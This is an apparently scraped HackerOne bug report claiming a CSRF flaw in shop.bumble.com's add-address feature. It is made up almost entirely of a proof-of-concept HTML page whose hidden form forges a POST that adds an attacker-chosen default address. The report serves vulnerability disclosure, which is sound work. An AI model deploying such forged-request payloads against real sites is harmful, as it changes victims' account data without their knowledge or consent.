# CSRF bug 

## Report Details
- **Report ID**: 239170
- **URL**: https://hackerone.com/reports/239170
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-06-12T08:35:29.389Z
- **Disclosed**: 2017-06-12T09:32:02.786Z

## Reporter
- **Username**: dark_heaven
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: bumble

## Vulnerability Information
Sir Recently I found a bug on add address. Check my exploit. It address can be default. I hope you will fix this as soon as possible 
<html>
  <body>
    <form action="https://shop.bumble.com/account/addresses" method="POST">
      <input type="hidden" name="form&#95;type" value="customer&#95;address" />
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="address&#91;first&#95;name&#93;" value="Rahamat" />
      <input type="hidden" name="address&#91;last&#95;name&#93;" value="Shah" />
      <input type="hidden" name="address&#91;company&#93;" value="dark" />
      <input type="hidden" name="address&#91;address1&#93;" value="12&#47;45" />
      <input type="hidden" name="address&#91;address2&#93;" value="" />
      <input type="hidden" name="address&#91;city&#93;" value="newyor" />
      <input type="hidden" name="address&#91;country&#93;" value="United&#32;States" />
      <input type="hidden" name="address&#91;province&#93;" value="Alabama" />
      <input type="hidden" name="address&#91;zip&#93;" value="" />
      <input type="hidden" name="address&#91;phone&#93;" value="" />
      <input type="hidden" name="address&#91;default&#93;" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


## Attachments
No attachments
